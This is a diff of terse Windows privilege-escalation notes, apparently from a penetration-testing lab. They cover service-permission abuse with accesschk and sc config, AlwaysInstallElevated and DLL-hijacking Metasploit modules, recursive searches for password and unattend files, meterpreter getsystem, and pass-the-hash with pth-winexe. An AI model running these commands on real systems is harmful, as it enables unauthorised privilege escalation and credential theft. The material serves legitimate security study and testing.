@@ -1,19 +1,30 @@
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
 
 net start  - get services
-tasklist /v   - get tasks
-dir *bob*.* /s   - locate a file
-cacls "C:\path\to\file.exe"   - check perms win xp and lower
+tasklist /v   - get tasks 
+dir *bob*.* /s  	-	locate a file
+cacls "C:\path\to\file.exe"  	-	check perms win xp and lower
 icacls   - Windows vista and up
 tasklist /v
-accesschk_v5.02.exe -qwcu "Authenticated Users" *
+
+C:\Windows\System32\eula.txt
+
+C:\Windows\System32\License.rtf
+
+Can be found for all these Windows operating systems
+
+Vista, W7, W8, W8.1 
+
+Metasploit:
+post/windows/gather/enum_patches
+post/multi/recon/local_exploit_suggester
 
 Weak Service Perms:
 accesschk.exe -qwcu "Authenticated Users" *
 accesschk.exe -qwcu "Users" *
 accesschk.exe -qwcu "Everyone" *
 if there isn't accesschk, upload it (/usr/share/windows-binary/)
-make sure to use "/accepteula" parameter if uploaded
+make sure to use "-accepteula" parameter
 
 Edit binary misconfigured service:
 Get service
@@ -30,29 +41,29 @@ sc config service obj= ".\LocalSystem" password= ""
 sc start service
 
 Restart service:
-wmic service NAMEOFSERVICE call startservice
+wmic service NAMEOFSERVICE call startservice 
 net stop [service name] && net start [service name]  
 
 AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
+both must contain DWORD of 1
+
 exploit/windows/local/always_install_elevated
 
+dir /b /s web.config
+dir /b /s unattend.xml
+dir /b /s sysprep.inf
+dir /b /s sysprep.xml
+dir /b /s *pass*
 
-C:\Windows\System32\eula.txt
+DLL Hijacking:
+use exploit/windows/local/ikeext_service
 
-C:\Windows\System32\License.rtf
-
-Can be found for all these Windows operating systems
-
-Vista, W7, W8, W8.1
-
+If you have admin access on a Windows box but want to upgrade to NT Authority/SYSTEM access, simply obtain a meterpreter session and run the getsystem command.  
 
 Pass the hash:
 root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896  
 
-root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd 
-
-If you have admin access on a Windows box but want to upgrade to NT Authority/SYSTEM access, simply obtain a meterpreter session and run the getsystem command.  
-
+root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd  
